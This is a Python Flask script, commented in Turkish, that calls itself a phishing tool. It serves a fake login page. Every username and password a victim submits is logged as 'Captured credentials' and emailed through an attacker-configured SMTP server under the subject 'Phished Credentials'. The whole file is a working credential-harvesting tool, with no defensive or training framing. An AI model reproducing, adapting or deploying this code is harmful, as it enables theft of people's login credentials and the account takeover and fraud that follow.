# -*- coding: utf-8 -*-
import smtplib
from email.mime.text import MIMEText
import logging
from flask import Flask, request, render_template_string, redirect, url_for
import argparse

app = Flask(__name__)

# Komut satırı argümanları
def parse_args():
    parser = argparse.ArgumentParser(description='Phishing tool configuration.')
    parser.add_argument('--smtp-server', type=str, required=True, help='SMTP server address')
    parser.add_argument('--smtp-port', type=int, required=True, help='SMTP server port')
    parser.add_argument('--smtp-user', type=str, required=True, help='SMTP username')
    parser.add_argument('--smtp-password', type=str, required=True, help='SMTP password')
    parser.add_argument('--log-file', type=str, default='phishing.log', help='Log file path')
    return parser.parse_args()

args = parse_args()

# Logging yapılandırması
logging.basicConfig(filename=args.log_file, level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

# Sahte giriş formları
login_forms = {
    'default': """
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Login</title>
        <style>
            body {
                font-family: Arial, sans-serif;
                background-color: #f4f4f4;
                display: flex;
                justify-content: center;
                align-items: center;
                height: 100vh;
                margin: 0;
            }
            .container {
                background-color: #fff;
                padding: 20px;
                box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
                border-radius: 8px;
                text-align: center;
            }
            .container h2 {
                margin-bottom: 20px;
            }
            .container input[type="text"],
            .container input[type="password"] {
                width: 100%;
                padding: 10px;
                margin: 10px 0;
                border: 1px solid #ccc;
                border-radius: 4px;
            }
            .container input[type="submit"] {
                background-color: #28a745;
                color: #fff;
                padding: 10px;
                border: none;
                border-radius: 4px;
                cursor: pointer;
            }
            .container input[type="submit"]:hover {
                background-color: #218838;
            }
        </style>
    </head>
    <body>
        <div class="container">
            <h2>Login</h2>
            <form method="POST" action="/login">
                <input type="text" id="username" name="username" placeholder="Username" required><br><br>
                <input type="password" id="password" name="password" placeholder="Password" required><br><br>
                <input type="submit" value="Login">
            </form>
        </div>
    </body>
    </html>
    """,
    # Diğer sahte formlar buraya eklenebilir
}

@app.route('/')
def home():
    return render_template_string(login_forms['default'])

@app.route('/login', methods=['POST'])
def login():
    try:
        username = request.form['username']
        password = request.form['password']
        
        # Kullanıcı bilgilerini log dosyasına kaydetme
        logging.info(f"Captured credentials - Username: {username}, Password: {password}")
        
        # Kullanıcı bilgilerini SMTP sunucusuna gönderme
        send_email(username, password)
        
        return redirect(url_for('home'))
    except Exception as e:
        logging.error(f"Error capturing login information: {e}")
        return "An error occurred. Please try again later."

def send_email(username, password):
    try:
        msg = MIMEText(f"Captured credentials:\nUsername: {username}\nPassword: {password}")
        msg['Subject'] = 'Phished Credentials'
        msg['From'] = args.smtp_user
        msg['To'] = args.smtp_user

        with smtplib.SMTP(args.smtp_server, args.smtp_port) as server:
            server.starttls()
            server.login(args.smtp_user, args.smtp_password)
            server.sendmail(args.smtp_user, [args.smtp_user], msg.as_string())
    except Exception as e:
        logging.error(f"Failed to send email: {e}")

def main():
    app.run(host='0.0.0.0', port=5000)

if __name__ == "__main__":
    main()